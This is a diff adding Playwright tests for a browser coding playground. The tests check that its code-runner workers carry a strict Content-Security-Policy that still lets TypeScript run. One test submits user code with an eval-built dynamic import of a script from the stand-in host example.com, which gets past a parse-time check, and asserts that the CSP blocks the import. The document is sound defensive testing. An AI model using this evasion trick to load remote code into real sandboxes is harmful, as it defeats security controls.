@@ -121,6 +121,44 @@ test('runners are lazy: no worker or CDN runtime until Run, then only the JS wor
   expect(workers).toHaveLength(1)
   // JavaScript needs no CDN runtime.
   expect(cdn).toEqual([])
+
+  // The worker script carries its own CSP: no network except the runtime CDN.
+  const res = await page.request.get(workers[0]!.split('#')[0]!)
+  const csp = res.headers()['content-security-policy'] ?? ''
+  expect(csp).toContain("default-src 'none'")
+  expect(csp).toContain('connect-src')
+  expect(csp).not.toMatch(/connect-src[^;]*\*/)
+
+  // TypeScript runs in its own worker (the transpiler never loads for JavaScript),
+  // and still works after a JavaScript run locked the JS worker's network.
+  await chooseLanguage(page, 'TypeScript')
+  await setCode(page, RIGHT.replace('(amounts, target)', '(amounts: number[], target: number): number[]').replace('new Map()', 'new Map<number, number>()'))
+  await page.getByRole('button', { name: 'Run', exact: true }).click()
+  await expect(page.getByTestId('verdict')).toHaveText('Accepted', { timeout: 60_000 })
+  expect(workers).toHaveLength(2)
+})
+
+test('the worker CSP stops eval-built imports from other hosts', async ({ page }) => {
+  // Chromium reports a request event even for a fetch CSP then blocks: count
+  // only requests that got a response, and record why the others failed.
+  const outbound: string[] = []
+  const failed: string[] = []
+  page.on('requestfinished', (r) => {
+    if (r.url().includes('example.com')) outbound.push(r.url())
+  })
+  page.on('requestfailed', (r) => {
+    if (r.url().includes('example.com')) failed.push(r.failure()?.errorText ?? 'failed')
+  })
+  await page.goto(`/playground/problems/${SLUG}`)
+  await chooseLanguage(page, 'JavaScript')
+  // An eval-built dynamic import gets past the parse-time check; the CSP must stop it.
+  await setCode(page, `function refundPair(amounts, target) {\n  (0, eval)('import("https://example.com/lee-probe.js")').catch(() => null)\n  return [0, 3]\n}`)
+  await page.getByRole('button', { name: 'Run', exact: true }).click()
+  await expect(page.getByTestId('verdict')).toBeVisible({ timeout: 60_000 })
+  // The pooled worker stays alive, so an allowed import would have gone out by now.
+  await page.waitForTimeout(1500)
+  expect(outbound).toEqual([])
+  expect(failed).toEqual(['csp'])
 })
 
 test('a compile error is reported before any test runs', async ({ page }) => {
